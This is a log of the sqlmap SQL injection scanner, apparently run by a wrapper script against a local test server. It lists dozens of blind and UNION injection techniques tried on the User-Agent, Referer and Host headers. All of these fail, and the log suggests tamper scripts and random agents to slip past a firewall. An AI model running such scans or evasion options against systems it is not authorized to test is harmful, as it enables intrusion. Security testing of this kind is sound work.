[18:56:23] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:56:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:56:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:56:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:56:24] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:56:24] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:56:24] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:56:24] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:56:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:56:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:56:24] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:56:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:56:24] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:24] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:24] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:24] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:56:25] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:56:25] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:56:25] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:56:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:56:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:56:26] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:56:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:56:27] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:56:28] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:56:28] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:56:29] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:56:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:56:29] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:56:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:56:30] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:56:30] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[18:56:30] [INFO] testing if parameter 'User-Agent' is dynamic
[18:56:30] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[18:56:30] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[18:56:30] [INFO] testing for SQL injection on parameter 'User-Agent'
[18:56:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:56:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:56:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:56:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:56:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:34] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:56:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:34] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:35] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:36] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:37] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:37] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:38] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:56:39] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:56:39] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:56:39] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:56:39] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:56:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:56:39] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:56:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:56:39] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:56:39] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:56:39] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:56:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:56:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:56:40] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:56:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:40] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:56:40] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:56:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:56:40] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:56:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:56:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:56:41] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:56:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:56:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:56:41] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:56:42] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:56:42] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:56:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:56:43] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:56:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:56:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:56:44] [WARNING] parameter 'User-Agent' does not seem to be injectable
[18:56:44] [INFO] testing if parameter 'Referer' is dynamic
[18:56:44] [WARNING] parameter 'Referer' does not appear to be dynamic
[18:56:44] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[18:56:44] [INFO] testing for SQL injection on parameter 'Referer'
[18:56:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:56:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:56:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:56:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:56:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:56:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:56:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:56:48] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:56:49] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:56:50] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:56:51] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:51] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:56:52] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:52] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:56:52] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:56:53] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:56:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:56:53] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:56:53] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:56:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:56:53] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:56:54] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:56:54] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:56:54] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:56:54] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:56:54] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:56:54] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:56:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:56:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:56:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:56:54] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:56:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:56:54] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:56:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:56:54] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:56:55] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:56:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:56:55] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:56:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:56:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:56:55] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:56:56] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:56:56] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:56:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:56:57] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:56:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:56:58] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:56:58] [WARNING] parameter 'Referer' does not seem to be injectable
[18:56:58] [INFO] testing if parameter 'Host' is dynamic
[18:56:58] [WARNING] parameter 'Host' does not appear to be dynamic
[18:56:58] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[18:56:58] [INFO] testing for SQL injection on parameter 'Host'
[18:56:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:56:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:57:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:57:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:57:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:57:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:57:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:57:02] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:57:02] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:57:03] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:57:03] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:57:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:57:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:57:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:57:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:57:06] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:57:06] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:57:06] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:57:07] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:57:07] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:57:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:57:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:57:08] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:57:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:57:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:57:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:57:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:57:08] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:57:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:57:08] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:57:08] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:57:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:57:09] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:57:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:57:09] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:57:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:57:09] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:57:10] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:57:10] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:57:10] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:57:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:57:11] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:57:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:57:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:57:12] [WARNING] parameter 'Host' does not seem to be injectable
[18:57:12] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:57:12] [WARNING] HTTP error codes detected during run:
405 (Method Not Allowed) - 5160 times, 404 (Not Found) - 2360 times

[*] ending @ 18:57:12 /2025-09-26/

2025-09-26 18:57:13,118 - INFO - No clear injection detected during discovery for http://localhost:5000/pickle
2025-09-26 18:57:13,118 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/proxy
2025-09-26 18:57:16,608 - INFO -         ___
2025-09-26 18:57:16,608 - INFO -        __H__
2025-09-26 18:57:16,608 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
